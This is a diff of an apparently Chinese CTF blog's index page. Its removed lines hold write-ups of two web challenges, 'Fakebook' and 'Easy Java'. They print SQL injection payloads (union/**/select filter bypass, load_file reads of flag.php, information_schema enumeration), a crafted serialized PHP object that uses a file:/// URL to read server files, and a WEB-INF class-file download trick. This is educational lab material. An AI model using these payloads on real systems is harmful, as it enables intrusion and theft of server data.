@@ -674,7 +674,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-03-24 12:53:26" itemprop="dateModified" datetime="2023-03-24T12:53:26+08:00">2023-03-24</time>
+                <time title="Modified: 2023-11-16 20:14:06" itemprop="dateModified" datetime="2023-11-16T20:14:06+08:00">2023-11-16</time>
               </span>
 
           
@@ -688,75 +688,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>用nikto扫描网址发现&#x2F;robots.txt</p>
-<p><img src="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303232032243.png" alt="image-20230323203229130"></p>
-<p>访问robots.txt发现</p>
-<p><img src="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303232034514.png" alt="image-20230323203423471"></p>
-<p>下载&#x2F;user.php.bak</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="variable language_">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>我们先回到首页，点join注册一个账号</p>
-<p><img src="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303232052084.png" alt="image-20230323205228032"></p>
-<p>这个页面，也就一个username可以点进去，于是我们点进入，发现no这个地方可以注入，于是拿去sqlmap上跑一手，发现没有跑出来。</p>
-<p>于是尝试手工注入：</p>
-<p>?no &#x3D; 1 and 1&#x3D;1　　&#x2F;&#x2F;回显正常</p>
-<p>?no &#x3D; 1 and 1&#x3D;2　　&#x2F;&#x2F;错误回显</p>
-<p>铁定数字型注入，于是我们看看表中有多少列，确定一下列数，</p>
-<p>?no &#x3D; 1 order by 3　　　　&#x2F;&#x2F;正常</p>
-<p>?no &#x3D; 1 order by 4　　　　&#x2F;&#x2F;正常</p>
-<p>?no &#x3D; 1 order by 5　　　　&#x2F;&#x2F;错误</p>
-<p>所以确定列数，有4列</p>
-<p>于是我们尝试union联合注入：</p>
-<p>?no &#x3D; -1 union select 1,2,3,4 –+</p>
-<p>结果显示nothack，通过大佬wp中发现，过滤了union select</p>
-<p>于是我们再次构造payload:</p>
-<p>?no &#x3D; -1 union&#x2F;**&#x2F;select 1,2,3,4–+</p>
-<p><img src="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303232104220.png" alt="image-20230323210420165"></p>
-<p>回显位是username,</p>
-<p>然后我们开始查数据库和数据库信息</p>
-<p>?no&#x3D;-1 union&#x2F;**&#x2F;select 1,database(),3,4–+　　&#x2F;&#x2F;数据库名</p>
-<p><img src="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303232120804.png" alt="image-20230323212057764"></p>
-<p>?no&#x3D;-1 union&#x2F;**&#x2F;select 1,user(),3,4–+　　　　&#x2F;&#x2F;数据库信息</p>
-<p><img src="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303232121575.png" alt="image-20230323212127535"></p>
-<p>发现居然是root权限，那我们知道有一个load_file()函数可以利用绝对路径去加载一个文件，于是我们利用一下</p>
-<p>load_file(file_name):file_name是一个完整的路径，于是我们直接用var&#x2F;www&#x2F;html&#x2F;flag.php路径去访问一下这个文件</p>
-<p>?no&#x3D;-1 union&#x2F;**&#x2F;select 1,load_file(“&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php”),3,4–+</p>
-<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/2075370/202012/2075370-20201208173108300-468964585.png"><img src="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303232125893.png" alt="img"></a></p>
-<p> 结果我们得到了flag。这也是我看一个大佬的博客上面用的，我也是学到了这个知识。</p>
-<p>接着我们继续往下看 不用这个方法</p>
-<p>我们接着爆数据库表：</p>
-<p>?no&#x3D;-1 union&#x2F;**&#x2F;select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema&#x3D;database()–+</p>
-<p><img src="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303232128183.png" alt="image-20230323212800149"></p>
-<p> 获得一张users表</p>
-<p>然后爆字段名：</p>
-<p>?no&#x3D;-1 union&#x2F;**&#x2F;select 1,group_concat(column_name),3,4 from information_schema.columns where table_name&#x3D;’users’–+</p>
-<p><img src="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303232129417.png" alt="image-20230323212934384"></p>
-<p>?no&#x3D;-1 union&#x2F;**&#x2F;select 1,data,3,4 from users –+</p>
-<p><img src="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303232131587.png" alt="image-20230323213124549"></p>
-<p> 是个序列化后的UserInfo对象，这和我们最开始得到的user.php.bak文件有关系了。</p>
-<p>在这里我们是不是可以利用一下呢？于是我们对这个序列化后的内容稍作改动</p>
-<p>O:8:”UserInfo”:3:{s:4:”name”;s:5:”admin”;s:3:”age”;i:19;s:4:”blog”;s:29:”file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php”;}</p>
-<p>然后构造payload:</p>
-<p>?no&#x3D;-1 union&#x2F;**&#x2F;select 1,2,3,’O:8:”UserInfo”:3:{s:4:”name”;s:5:”admin”;s:3:”age”;i:19;s:4:”blog”;s:29:”file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php”;}’</p>
-<p>然后我们查看源码，发现读出来的数据，base64解密获得flag</p>
-<p><img src="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303232134610.png" alt="image-20230323213401575"></p>
-<p>flag{549b4e3c-01a4-4ffc-af8b-345241d9cf28}</p>
-<h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><h1 id="这题主要考察："><a href="#这题主要考察：" class="headerlink" title="这题主要考察："></a>这题主要考察：</h1><p>WEB-INF主要包含一下文件或目录:</p>
-<p>&#x2F;WEB-INF&#x2F;web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</p>
-<p>&#x2F;WEB-INF&#x2F;classes&#x2F;：含了站点所有用的 class文件，包括servletclass和非servletclass，他们不能包含在 .jar文件中</p>
-<p>&#x2F;WEB-INF&#x2F;lib&#x2F;：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件&#x2F;WEB-INF&#x2F;src&#x2F;：源码目录，按照包名结构放置各个java文件。</p>
-<p>&#x2F;WEB-INF&#x2F;database.properties：数据库配置文件</p>
-<p>漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</p>
-<p><img src="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303241218197.png" alt="image-20230324121836152"></p>
-<p>查看下配置文件看看</p>
-<p><img src="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303241219483.png" alt="image-20230324121909400"></p>
-<p>构造<code>filename=WEB-INF/classes/com/wm/ctf/FlagController.class</code></p>
-<p><img src="https://ctzblog-1315220971.cos.ap-guangzhou.myqcloud.com/images/202303241220653.png" alt="image-20230324122008613"></p>
-<p>一段base64编码解码后获得</p>
-<p>flag{332bd58a-7a90-4efc-8de6-b9f2bab6dc06}</p>
-
+          <h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><h3 id=""><a href="#" class="headerlink" title=""></a></h3>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2023/03/23/web%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%957/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
